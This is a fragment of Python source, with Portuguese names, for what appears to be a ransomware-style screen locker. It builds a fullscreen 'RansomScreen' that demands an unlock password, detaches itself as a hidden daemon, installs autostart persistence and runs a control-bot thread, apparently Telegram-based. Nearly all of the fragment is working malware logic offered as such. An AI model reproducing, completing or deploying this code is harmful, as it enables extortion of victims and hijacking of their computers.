                    os.remove(ARQ_LOCK_FLAG)
            except Exception:
                pass

            self.canvas.delete("all")
            self.entry_telegram.destroy()
            self.btn_desbloquear.destroy()

            self.canvas.create_text(self.width // 2, self.height // 2 - 50,
                                    text="DESBLOQUEADO", fill=COR_VERMELHO,
                                    font=("Courier New", 60, "bold"))
            self.canvas.create_text(self.width // 2, self.height // 2 + 50,
                                    text=f"bem vindo de volta! {self.hostname}",
                                    fill=COR_VERMELHO, font=("Courier New", 30, "bold"))
            self.root.after(3000, lambda: os._exit(0))
        else:
            self.canvas.itemconfig(self.lbl_erro, text="SENHA INCORRETA! Tente novamente.")
            self.entry_telegram.delete(0, tk.END)
            self.entry_telegram.focus_set()


# ================= MAIN =================
if __name__ == "__main__":
    if esta_desbloqueado_recente():
        print("[Locker] Desbloqueado recentemente. Saindo.")
        sys.exit(0)

    if not WINDOWS and os.environ.get("LOCKER_DAEMON") != "1":
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
        os.setsid()
        os.environ["LOCKER_DAEMON"] = "1"
        devnull = os.open("/dev/null", os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)

    if not autostart_instalado():
        instalar_autostart()

    bot = BotControle()
    threading.Thread(target=bot.rodar, daemon=True).start()

    root = tk.Tk()
    app = RansomScreen(root, bot)
    bot.set_locker(app)

    root.mainloop()
